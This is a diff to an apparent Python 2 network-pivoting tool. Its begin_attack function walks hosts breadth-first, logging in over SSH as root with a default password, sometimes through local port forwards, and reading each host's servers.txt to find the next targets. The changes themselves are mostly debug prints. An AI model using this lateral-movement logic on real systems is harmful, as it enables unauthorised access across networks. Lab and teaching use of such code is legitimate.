@@ -30,10 +30,13 @@ class Computer:
         # keys = accountName
         # values = password
         self.accounts = {}
-        self.local_forward = ""
+        self.local_forward = 0
 
     def __str__(self):
-        print (self.ip, self.ssh_port, self.accounts)
+        print "IP:\t\t%s" % self.ip
+        print "\tSSH PORT:\t%d" % self.ssh_port
+        print "\tLOCAL FORWARD\t%d" % self.local_forward
+        print "\tACCOUNTS:\t\t%s" % self.accounts
 
 class ForwardServer (SocketServer.ThreadingTCPServer):
     daemon_threads = True
@@ -96,7 +99,8 @@ def get_host_port(data):
     args[1] = int(args[1])
     return args
 
-def begin_attack(client, host):
+def begin_attack(client):
+    global initial_comps, FORWARD_PORT
     print "Beginning attack"
 
     # executes BFS over network
@@ -110,6 +114,7 @@ def begin_attack(client, host):
                 client.connect(server.host, server.ssh_port, username=ROOT, password=DEFAULT_PASS)
             else:
                 client.connect("localhost", server.local_forward, username=ROOT, password=DEFAULT_PASS)
+                verbose("ssh localhost:%d" % server.local_forward)
 
         except Exception as e:
             print('*** Failed to connect to %s:%d: %r' % (server.host, server.ssh_port, e))
@@ -120,6 +125,7 @@ def begin_attack(client, host):
         # gets the servers.txt
         stdin, stdout, stderr = client.exec_command("cat ~/servers.txt")
         new_servers = stdout.readlines()
+        print "%s\n\t%s" % (server.ip, new_servers)
         new_servers = map(lambda x: x.strip(), new_servers)
         for s in new_servers:
             host, port = get_host_port(s)
@@ -140,6 +146,7 @@ def begin_attack(client, host):
                 except Exception as e:
                     print e
 
+    print "QUEUE EMPTY"
 
 
 if __name__ == "__main__":
